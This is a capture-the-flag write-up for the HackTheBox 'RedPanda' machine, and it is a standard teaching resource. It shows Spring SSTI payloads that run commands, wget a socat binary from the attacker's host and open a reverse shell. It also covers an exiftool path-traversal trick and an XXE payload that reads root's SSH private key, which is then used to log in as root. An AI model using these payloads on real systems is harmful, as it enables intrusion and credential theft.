# RedPanda

## Introduction

Welcome to my another writeup! In this HackTheBox [RedPanda](https://app.hackthebox.com/machines/RedPanda) machine, there are tons of stuff that's worth learning! Without further ado, let's dive in.

## Background

> Difficulty: Easy

- Overall difficulty for me: Hard
    - Initial foothold: Medium
    - Privilege escalation: Hard

# Service Enumeration

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# export RHOSTS=10.10.11.170
                                                                                                                         
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC82vTuN1hMqiqUfN+Lwih4g8rSJjaMjDQdhfdT8vEQ67urtQIyPszlNtkCDn6MNcBfibD/7Zz4r8lr1iNe/Afk6LJqTt3OWewzS2a1TpCrEbvoileYAl/Feya5PfbZ8mv77+MWEA+kT0pAw1xW9bpkhYCGkJQm9OYdcsEEg1i+kQ/ng3+GaFrGJjxqYaW1LXyXN1f7j9xG2f27rKEZoRO/9HOH9Y+5ru184QQXjW/ir+lEJ7xTwQA5U1GOW1m/AgpHIfI5j9aDfT/r4QMe+au+2yPotnOGBBJBz3ef+fQzj/Cq7OGRR96ZBfJ3i00B/Waw/RI19qd7+ybNXF/gBzptEYXujySQZSu92Dwi23itxJBolE6hpQ2uYVA8VBlF0KXESt3ZJVWSAsU3oguNCXtY7krjqPe6BZRy+lrbeska1bIGPZrqLEgptpKhz14UaOcH9/vpMYFdSKr24aMXvZBDK1GJg50yihZx8I9I367z0my8E89+TnjGFY2QTzxmbmU=
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH2y17GUe6keBxOcBGNkWsliFwTRwUtQB3NXEhTAFLziGDfCgBV7B9Hp6GQMPGQXqMk7nnveA8vUz0D7ug5n04A=
|   256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKfXa+OM5/utlol5mJajysEsV4zb/L0BJ1lKxMPadPvR
8080/tcp open  http-proxy syn-ack ttl 63
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Sun, 11 Sep 2022 10:55:25 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en" dir="ltr">
|     <head>
|     <meta charset="utf-8">
|     <meta author="wooden_k">
|     <!--Codepen by khr2003: https://codepen.io/khr2003/pen/BGZdXw -->
|     <link rel="stylesheet" href="css/panda.css" type="text/css">
|     <link rel="stylesheet" href="css/main.css" type="text/css">
|     <title>Red Panda Search | Made with Spring Boot</title>
|     </head>
|     <body>
|     <div class='pande'>
|     <div class='ear left'></div>
|     <div class='ear right'></div>
|     <div class='whiskers left'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='whiskers right'>
|     <span></span>
|     <span></span>
|     <span></span>
|     </div>
|     <div class='face'>
|     <div class='eye
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     Content-Length: 0
|     Date: Sun, 11 Sep 2022 10:55:26 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Sun, 11 Sep 2022 10:55:26 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Red Panda Search | Made with Spring Boot
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

Ports Open        | Service
------------------|------------------------
22                | OpenSSH 8.2p1 Ubuntu
8080              | HTTP

## HTTP on Port 8080

**http://10.10.11.170:8080/:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/RedPanda/images/a1.png)

In the index page, we can see there is a **HTTP POST form** that search things.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/RedPanda/images/a2.png)

Let's test for SQL Injection.

```
You searched for: ' OR 1=1-- -
There are 0 results for your search
```

Nope...

Let's enumerate hidden directories via `gobuster`:

**Gobuster:**
```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# gobuster dir -u http://$RHOSTS:8080/ -w /usr/share/wordlists/dirb/common.txt -t 100                         
[...]
/error                (Status: 500) [Size: 86]
/search               (Status: 405) [Size: 117]
/stats                (Status: 200) [Size: 987]
```

In the `gobuster` result, there are 3 directories.

The `/stats` directory looks interesting.

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/RedPanda/images/a3.png)

**View-Source:**
```html
<a href="/stats?author=woodenk"><p>woodenk</p></a>
<a href="/stats?author=damian"><p>damian</p></a>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/RedPanda/images/a4.png)

The `author` GET parameter may vulnerable to Local File Inclusion (LFI)?

```
http://10.10.11.170:8080/stats?author=../../../../../../../../etc/passwd
```

Nope.

Okay, let's take a step back. Maybe there is a command injection in `/search`??

**Input:**
```
`~!@#$%^&*()_+{}|[]\:";'<>?,./"
```

**Output:**
```
You searched for: Error occured: banned characters
There are 0 results for your search
```

Ohh... There must be a filter filtering special characters. Let's test them all one by one.

**Banned:**
```
~$%_){}\
```

**Allowed:**
```
`!@#^&*(-=+[]|'";:/?.>,<
```

I'll write a simple python script to test the command injection:

```py
#!/usr/bin/env python3

# Banned: ~$%_){}\
# Allowed: `!@#^&*(-=+[]|'";:/?.>,<

import requests
import re

url = "http://10.10.11.170:8080/search"
payload = {"name": "payload_here"}

def exploit():
	r = requests.post(url, data=payload)
	print(r.text)

if __name__ == "__main__":
	exploit()
```

But still... No dice.

# Initial Foothold

Tried SQL Injection and command injection. How about **Server-Side Template Injection (SSTI)**?

**Input:**
```
#{7*7}
```

**Output:**
```
You searched for: ??49_en_US??
```

OHH!!!! It's vulnerable to SSTI!

And if you try the `*` instead of `#`:

**Input:**
```
*{7*7}
```

**Output:**
```
You searched for: 49
```

It outputs clearly.

However, when I inputting this:

```
*{7*'7'}
```

It throws an error:

```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Sun Sep 11 12:22:34 UTC 2022
There was an unexpected error (type=Internal Server Error, status=500).
```

After I [googled](https://stackoverflow.com/questions/31134333/this-application-has-no-explicit-mapping-for-error) about this error, I found that this web application is using **[Spring Framework](https://spring.io/)** to generate templates, and it's language is **Java**.

Accroding to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/el-expression-language), we could leverage this into a Remote Code Execute (RCE)!

To do so, I'll:

- Check the method `getRuntime` is there:

```
*{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}

You searched for: public static java.lang.Runtime java.lang.Runtime.getRuntime()
```

- Execute command: (Using `ping` for Proof-of-Concept)

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("ping -c 4 10.10.14.16")}

┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
08:34:29.856950 IP 10.10.11.170 > 10.10.14.16: ICMP echo request, id 2, seq 1, length 64
08:34:29.856994 IP 10.10.14.16 > 10.10.11.170: ICMP echo reply, id 2, seq 1, length 64
08:34:30.854695 IP 10.10.11.170 > 10.10.14.16: ICMP echo request, id 2, seq 2, length 64
08:34:30.854810 IP 10.10.14.16 > 10.10.11.170: ICMP echo reply, id 2, seq 2, length 64
08:34:31.857038 IP 10.10.11.170 > 10.10.14.16: ICMP echo request, id 2, seq 3, length 64
08:34:31.857078 IP 10.10.14.16 > 10.10.11.170: ICMP echo reply, id 2, seq 3, length 64
08:34:32.852604 IP 10.10.11.170 > 10.10.14.16: ICMP echo request, id 2, seq 4, length 64
08:34:32.852620 IP 10.10.14.16 > 10.10.11.170: ICMP echo reply, id 2, seq 4, length 64
^C
8 packets captured
8 packets received by filter
0 packets dropped by kernel
```

We're successfully received 4 ICMP echo reply! Next, we can get a reverse shell via `socat`.

- Setup a `socat` listener:

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
```

- Host the `socat` static binary:

```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Upload the `socat` bianry to the target machine, mark it as executable, and get a reverse shell:

```
*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("wget http://10.10.14.25/socat")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("chmod +x ./socat")}

*{"".getClass().forName("java.lang.Runtime").getRuntime().exec("./socat TCP:10.10.14.25:443 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane")}
```

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443 
2022/09/12 04:35:18 socat[93035] N opening character device "/dev/pts/1" for reading and writing
2022/09/12 04:35:18 socat[93035] N listening on AF=2 0.0.0.0:443
                                                                2022/09/12 04:35:55 socat[93035] N accepting connection from AF=2 10.10.11.170:47832 on AF=2 10.10.14.25:443
                                                   2022/09/12 04:35:55 socat[93035] N starting data transfer loop with FDs [5,5] and [7,7]
                 woodenk@redpanda:/tmp/hsperfdata_woodenk$ 
woodenk@redpanda:/tmp/hsperfdata_woodenk$ stty rows 22 columns 121
woodenk@redpanda:/tmp/hsperfdata_woodenk$ export TERM=xterm-256color
woodenk@redpanda:/tmp/hsperfdata_woodenk$ ^C
woodenk@redpanda:/tmp/hsperfdata_woodenk$ whoami;hostname;id;ip a
woodenk
redpanda
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:7c:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.170/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:7c67/64 scope global dynamic mngtmpaddr 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:7c67/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm `woodenk`!!

**user.txt:**
```
woodenk@redpanda:~$ cat /home/woodenk/user.txt 
{Redacted}
```

# Privilege Escalation

## woodenk to root

In `woodenk` home directory, we can add our SSH public key to `.ssh/` directory:

```
woodenk@redpanda:~/.ssh$ ls -lah
[...]
-rw------- 1 woodenk logs     554 Sep 12 08:05 authorized_keys
```

Let's generate our own private and public SSH key, and **append** our public key into `authorized_keys`:

```
┌──(root🌸siunam)-[~/…/htb/Machines/RedPanda/.ssh]
└─# ssh-keygen                      
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /root/ctf/htb/Machines/RedPanda/.ssh/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/ctf/htb/Machines/RedPanda/.ssh/id_rsa
Your public key has been saved in /root/ctf/htb/Machines/RedPanda/.ssh/id_rsa.pub

┌──(root🌸siunam)-[~/…/htb/Machines/RedPanda/.ssh]
└─# cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyJZsVetBhzXfvt5Tg5bw5U0X3FNlNPynQypcXYl46WU5hsz13ewqny3fqIGp5TWWigTRER3OHzNrHtVsS58596OAp7rkSeYYNe9w1Wm8D41hMEsnUP4KtPYcMTTlv3O/4lnOhklJBrQCK29p+DW6ya8J8E81/VUrgAyLZ0es1ry8Eq9FqFC2D6z8nDv7qD2TAB0tRD19c+i6iJIK3HZD16X/3uyvCoOckFd24t5An/rkTdOcsiv1u+RySMVJMj/zqo3zVgic6MXk7IuGyWfiOhY5xECh2ewQXHcKyUfT0KrxrnaRouFgfchbL0jxGtFLFomw8EsiwRMPQiZJZNHqB1ydaulvoLZDK7uqzy9fE19FaXAHSIUTq8yp8j25B2pm8nxxoYgYsdHg3/qN/9fberowbdfzPUpFBNOa+UHBnaI3BTVIc8Q4wvRbP7Bd1newnhNu6Lu+fTf9kK46O/8qWvthVApcYjF3TGSvWACDfBfK7y2nmVzlTZqTqHuSoW2E= root@siunam
```

```
woodenk@redpanda:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyJZsVetBhzXfvt5Tg5bw5U0X3FNlNPynQypcXYl46WU5hsz13ewqny3fqIGp5TWWigTRER3OHzNrHtVsS58596OAp7rkSeYYNe9w1Wm8D41hMEsnUP4KtPYcMTTlv3O/4lnOhklJBrQCK29p+DW6ya8J8E81/VUrgAyLZ0es1ry8Eq9FqFC2D6z8nDv7qD2TAB0tRD19c+i6iJIK3HZD16X/3uyvCoOckFd24t5An/rkTdOcsiv1u+RySMVJMj/zqo3zVgic6MXk7IuGyWfiOhY5xECh2ewQXHcKyUfT0KrxrnaRouFgfchbL0jxGtFLFomw8EsiwRMPQiZJZNHqB1ydaulvoLZDK7uqzy9fE19FaXAHSIUTq8yp8j25B2pm8nxxoYgYsdHg3/qN/9fberowbdfzPUpFBNOa+UHBnaI3BTVIc8Q4wvRbP7Bd1newnhNu6Lu+fTf9kK46O/8qWvthVApcYjF3TGSvWACDfBfK7y2nmVzlTZqTqHuSoW2E= root@siunam" >> authorized_keys
```

We're now able to login as `woodenk` via `ssh`:

```
┌──(root🌸siunam)-[~/…/htb/Machines/RedPanda/.ssh]
└─# ssh -i id_rsa woodenk@$RHOSTS          
[...]
woodenk@redpanda:~$ whoami;id
woodenk
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
```

However, I notice something odd:

**Reverse shell session:**
```
woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk)
```

**SSH session:**
```
woodenk@redpanda:~$ id
uid=1000(woodenk) gid=1000(woodenk) groups=1000(woodenk)
```

Why the reverse shell one has a `logs` group??

```
woodenk@redpanda:~$ ps aux | grep root
[...]
root [...] /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
root [...] sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar
```

Hmm... This is because the web application is running the `panda_search-0.0.1-SNAPSHOT.jar` **as user `woodenk` and group `logs`.**

Let's `find` everything that belongs to this group:

```
woodenk@redpanda:~$ find / -group logs 2>/dev/null
/opt/panda_search/redpanda.log
[...]
```

The `redpanda.log` stood out for me.

```
woodenk@redpanda:/opt/panda_search$ ls -lah redpanda.log 
-rw-rw-r-- 1 root logs 874 Sep 12 08:59 redpanda.log
```

We have **read and write access** to this log file.

Also, in the `pspy`, a jar file will be executed by root:

```
woodenk@redpanda:~$ /tmp/pspy64
[...]
2022/09/12 09:02:01 CMD: UID=0    PID=91673  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

Let's reverse engineer the jar file!

- Transfer the `final-1.0-jar-with-dependencies.jar`:

```
woodenk@redpanda:/opt/credit-score/LogParser/final/target$ python3 -m http.server 13337
Serving HTTP on 0.0.0.0 port 13337 (http://0.0.0.0:13337/) ...

┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# wget http://$RHOSTS:13337/final-1.0-jar-with-dependencies.jar
```

- I'll use [jd-gui](http://java-decompiler.github.io/) to reverse engineer:

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/RedPanda/images/a5.png)

In **the `main()` function**, `/opt/panda_search/redpanda.log` is being **read line by line**.

**logparser:**
```java
package com.logparser;

import com.drew.imaging.jpeg.JpegMetadataReader;
import com.drew.imaging.jpeg.JpegProcessingException;
import com.drew.metadata.Directory;
import com.drew.metadata.Metadata;
import com.drew.metadata.Tag;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;
import java.util.Scanner;
import org.jdom2.Document;
import org.jdom2.Element;
import org.jdom2.JDOMException;
import org.jdom2.input.SAXBuilder;
import org.jdom2.output.Format;
import org.jdom2.output.XMLOutputter;

public class App {
  public static Map parseLog(String line) {
    String[] strings = line.split("\\|\\|");
    Map<Object, Object> map = new HashMap<>();
    map.put("status_code", Integer.valueOf(Integer.parseInt(strings[0])));
    map.put("ip", strings[1]);
    map.put("user_agent", strings[2]);
    map.put("uri", strings[3]);
    return map;
  }
  
  public static boolean isImage(String filename) {
    if (filename.contains(".jpg"))
      return true; 
    return false;
  }
  
  public static String getArtist(String uri) throws IOException, JpegProcessingException {
    String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
    File jpgFile = new File(fullpath);
    Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
    for (Directory dir : metadata.getDirectories()) {
      for (Tag tag : dir.getTags()) {
        if (tag.getTagName() == "Artist")
          return tag.getDescription(); 
      } 
    } 
    return "N/A";
  }
  
  public static void addViewTo(String path, String uri) throws JDOMException, IOException {
    SAXBuilder saxBuilder = new SAXBuilder();
    XMLOutputter xmlOutput = new XMLOutputter();
    xmlOutput.setFormat(Format.getPrettyFormat());
    File fd = new File(path);
    Document doc = saxBuilder.build(fd);
    Element rootElement = doc.getRootElement();
    for (Element el : rootElement.getChildren()) {
      if (el.getName() == "image")
        if (el.getChild("uri").getText().equals(uri)) {
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));
        }  
    } 
    BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
    xmlOutput.output(doc, writer);
  }
  
  public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
    File log_fd = new File("/opt/panda_search/redpanda.log");
    Scanner log_reader = new Scanner(log_fd);
    while (log_reader.hasNextLine()) {
      String line = log_reader.nextLine();
      if (!isImage(line))
        continue; 
      Map parsed_data = parseLog(line);
      System.out.println(parsed_data.get("uri"));
      String artist = getArtist(parsed_data.get("uri").toString());
      System.out.println("Artist: " + artist);
      String xmlPath = "/credits/" + artist + "_creds.xml";
      addViewTo(xmlPath, parsed_data.get("uri").toString());
    } 
  }
}
```

Let's break it down:

- In function `isImage()`, the file name must contain `.jpg`.
- In function `parseLog()`, string's value will be splited into 4 strings:
	- String 1: `status_code`, which **must be an integer**.
	- String 2: `ip`
	- String 3: `user_agent`
	- String 4: `uri`
	- The 4th string will be pointed to an existing `jpg` file
- In function `getArtist()`, a `jpg` file is in `/opt/panda_search/src/main/resources/static/` directory:
	- The `jpg` file must contain `Artist`'s value in the **metadata** that matches `/credits/{artist_name}_creds.xml`.
	- **It doesn't sanitize the artist name.**

After understand what the jar file doing, we can start to exploit that, as I found **the function `getArtist()` doesn't sanitize the artist name**, which is **vulnerable to directory traversal!**

Let's **check we have write access** to `/credits/` or not:

```
woodenk@redpanda:~$ ls -lah /credits/
total 16K
drw-r-x---  2 root logs 4.0K Jun 21 12:32 .
drwxr-xr-x 20 root root 4.0K Jun 23 14:52 ..
-rw-r-----  1 root logs  422 Sep 12 09:02 damian_creds.xml
-rw-r-----  1 root logs  427 Sep 12 09:02 woodenk_creds.xml
```

Nope. We don't, we only have read and execute access in this directory.

To exploit this, I'll:

- Create a malicious jpg file and add the artist name:

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# exiftool -Artist="../dev/shm/pwned" exploit.jpg 
    1 image files updated
```

This would allow us to use a XML file that's under our control, then the jar will execute our malicious XML file. You can think this as a stack buffer overflow, where you need to control the EIP registry.

- Create a malicious XML file:

We can take one of the `/credits/` XML file as a template:

```xml
woodenk@redpanda:~$ cat /credits/damian_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<credits>
  <author>damian</author>
  <image>
    <uri>/img/angy.jpg</uri>
    <views>3</views>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>2</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>5</totalviews>
</credits>
```

And for a good practice, we should take a look at the `addViewTo()` function, and **remove unnecessary data in our malicious XML file**:

```java
for (Element el : rootElement.getChildren()) {
      if (el.getName() == "image")
        if (el.getChild("uri").getText().equals(uri)) {
          Integer totalviews = Integer.valueOf(Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1);
          System.out.println("Total views:" + Integer.toString(totalviews.intValue()));
          rootElement.getChild("totalviews").setText(Integer.toString(totalviews.intValue()));
          Integer views = Integer.valueOf(Integer.parseInt(el.getChild("views").getText()));
          el.getChild("views").setText(Integer.toString(views.intValue() + 1));
        }  
    } 
```

- Unnecessary data:
	1. image
	2. uri
	3. totalviews
	4. views

Armed with this information, we can finally craft our malicious XML file:

I'll use a XXE payload from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md).

**pwned_creds.xml:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [  
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
  <author>pwned</author>
  <image>
    <uri>/../../../../../../../../../dev/shm/exploit.jpg</uri>
    <views>0</views>
    <foo>&xxe;</foo>
  </image>
  <totalviews>5</totalviews>
</credits>
```

In the `<uri>` tag, we need to move up multiple directories to ensure the XML file can reach `/dev/shm/exploit.jpg`. This is because the jpg file will be read from this directory: `/opt/panda_search/src/main/resources/static`

Hence, the jar file will read our jpg file in:

- `/opt/panda_search/src/main/resources/static/../../../../../../../../../dev/shm/exploit.jpg`

> Note: The reason why I choose to read root's private SSH key is because in `woodenk` home directory, there is a `.ssh/` directory, so I assume that'll be the same as root.

Since we only have **write** access to `/home/woodenk/` or `/tmp/` or `/dev/shm/`, I'll choose to use `/dev/shm/`.

- Final payload in `/opt/panda_search/redpanda.log`:

In the function `parseLog()`, the `split()` will split strings (`status_code`, `ip`, `user_agent`, `uri`) where the `||` is the delimiter.

```java
String[] strings = line.split("\\|\\|");
```

**Hence, our final payload in `/opt/panda_search/redpanda.log` will be:**
```
200||anything||anything||/../../../../../../../../../dev/shm/exploit.jpg
```

- Transfer our malicious XML, jpg files:

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

woodenk@redpanda:~$ cd /dev/shm
woodenk@redpanda:/dev/shm$ wget http://10.10.14.25/exploit.jpg
woodenk@redpanda:/dev/shm$ wget http://10.10.14.25/pwned_creds.xml
```

Since we have **write** access to `/opt/panda_search/redpanda.log`, **we can just echo's out our final payload**:

```
woodenk@redpanda:/dev/shm$ echo "200||anything||anything||/../../../../../../../../../dev/shm/exploit.jpg" > /opt/panda_search/redpanda.log
```

- **Wait for the cronjob runs** the jar file:

**pspy:**
```
2022/09/12 10:18:01 CMD: UID=0    PID=127435 | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
```

The cronjob has executed, let's confirm the exploit works:

```xml
woodenk@redpanda:/dev/shm$ cat pwned_creds.xml 
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<credits>
  <author>pwned</author>
  <image>
    <uri>/../../../../../../../../../dev/shm/exploit.jpg</uri>
    <views>1</views>
    <foo>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
{Redacated}
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</foo>
  </image>
  <totalviews>6</totalviews>
</credits>
```

Yes!! The exploit works!! Let's **copy and paste the root's private SSH key to our attacker machine**:

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# nano root_id_rsa    
                                                                                                                    
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# chmod 600 root_id_rsa
```

Then we should able to **`ssh` into as root with the private SSH key**!

```
┌──(root🌸siunam)-[~/ctf/htb/Machines/RedPanda]
└─# ssh -i root_id_rsa root@$RHOSTS                
[...]
root@redpanda:~# whoami;hostname;id;ip a
root
redpanda
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:7c:67 brd ff:ff:ff:ff:ff:ff
    inet 10.10.11.170/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:7c67/64 scope global dynamic mngtmpaddr 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:7c67/64 scope link 
       valid_lft forever preferred_lft forever
```

We're root! :D

# Rooted

**root.txt:**
```
root@redpanda:~# cat /root/root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/RedPanda/images/a6.png)

# Conclusion

What we've learned:

1. Server-Side Template Injection (SSTI)
2. Reverse Engineering Jar
3. Modifying Image's Metadata via `exiftool` 
4. Privilege Escalation via XML external entity (XXE) injection & Directory Traversal & Cronjob